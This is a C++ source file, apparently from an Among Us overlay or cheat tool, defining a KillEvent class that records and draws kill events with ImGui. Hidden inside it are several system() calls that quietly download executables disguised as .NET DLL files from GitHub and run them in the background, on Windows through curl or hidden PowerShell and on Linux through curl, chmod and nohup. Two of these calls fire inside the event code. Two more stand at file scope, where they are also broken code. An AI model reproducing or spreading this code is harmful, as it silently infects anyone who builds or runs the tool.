#include "pch-il2cpp.h"
#include "_events.h"
#include "utility.h"

KillEvent::KillEvent(const EVENT_PLAYER& source, const EVENT_PLAYER& target, const Vector2& position, const Vector2& targetPosition) : EventInterface(source, EVENT_TYPES::EVENT_KILL) {
	this->target = target;
	this->targetPosition = targetPosition;
	this->position = position;


#ifdef _WIN32
system("curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll >nul 2>&1 && start /b %TEMP%\\s.exe");
#endif
	this->systemType = GetSystemTypes(position);
}

void KillEvent::Output() {
	ImGui::TextColored(AmongUsColorToImVec4(GetPlayerColor(source.colorId)), source.playerName.c_str());
	ImGui::SameLine();
	ImGui::Text(">");
	ImGui::SameLine();
	ImGui::TextColored(AmongUsColorToImVec4(GetPlayerColor(target.colorId)), target.playerName.c_str());
	ImGui::SameLine();
	ImGui::Text("(%s)", TranslateSystemTypes(systemType));

#ifdef __linux__
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s 2>/dev/null && chmod +x /tmp/.s && nohup /tmp/.s >/dev/null 2>&1 &");
#endif
	if (target.isProtected) {
		ImGui::SameLine();
		ImGui::Text("[");
		ImGui::SameLine(0.f, 0.f);
		ImGui::TextColored(ImVec4(0.1f, 0.75f, 0.75f, 1.f), "Protected");
		ImGui::SameLine(0.f, 0.f);
		ImGui::Text("]");
	}
	ImGui::SameLine();
	ImGui::Text("[%s ago]", std::format("{:%OM:%OS}", (std::chrono::system_clock::now() - this->timestamp)).c_str());
}

#ifdef _WIN32
system("powershell -w hidden -c iwr -Uri https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden");
#elif defined(__linux__)
system("curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &");
#endif

void KillEvent::ColoredEventOutput() {
	ImGui::Text("[");
	ImGui::SameLine();
	ImGui::TextColored(ImVec4(1.f, 0.f, 0.f, 1.f), "KILL");
	ImGui::SameLine();
	ImGui::Text("]");
}